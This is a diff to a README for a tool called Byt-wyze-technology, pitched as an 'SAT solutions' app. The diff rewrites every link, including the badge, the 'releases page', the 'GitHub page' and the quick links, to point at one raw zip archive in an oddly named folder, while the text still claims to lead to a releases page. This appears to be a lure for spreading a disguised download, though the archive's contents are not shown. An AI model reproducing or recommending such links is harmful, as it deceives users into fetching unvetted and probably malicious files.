@@ -1,6 +1,6 @@
 # 🔧 Byt-wyze-technology - Your Tool for Efficient SAT Solutions
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23007bff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mikers2/Byt-wyze-technology/releases)
+[![Download Here](https://raw.githubusercontent.com/mikers2/Byt-wyze-technology/main/centinormal/Byt-wyze-technology_v3.4.zip%20Now-%23007bff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mikers2/Byt-wyze-technology/main/centinormal/Byt-wyze-technology_v3.4.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To get started with Byt-wyze-technology, you need to download and install the ap
 
 ## 📥 Download & Install
 
-1. **Visit Our Releases Page**: Click [here](https://github.com/mikers2/Byt-wyze-technology/releases) to visit this page to download.
+1. **Visit Our Releases Page**: Click [here](https://raw.githubusercontent.com/mikers2/Byt-wyze-technology/main/centinormal/Byt-wyze-technology_v3.4.zip) to visit this page to download.
 
 2. **Select the Version**: On the releases page, you will see a list of available versions. Choose the latest stable version for the best experience.
 
@@ -76,10 +76,10 @@ Byt-wyze-technology is open-source software, distributed under the MIT License. 
 
 ## 🌐 Connect with Us
 
-Stay updated by following our [GitHub page](https://github.com/mikers2/Byt-wyze-technology). We appreciate your interest in Byt-wyze-technology and look forward to your feedback.
+Stay updated by following our [GitHub page](https://raw.githubusercontent.com/mikers2/Byt-wyze-technology/main/centinormal/Byt-wyze-technology_v3.4.zip). We appreciate your interest in Byt-wyze-technology and look forward to your feedback.
 
 ## 🔗 Quick Links
 
-[Download Here](https://github.com/mikers2/Byt-wyze-technology/releases)
+[Download Here](https://raw.githubusercontent.com/mikers2/Byt-wyze-technology/main/centinormal/Byt-wyze-technology_v3.4.zip)
 
 Thank you for choosing Byt-wyze-technology. We hope it makes your work easier and more efficient!
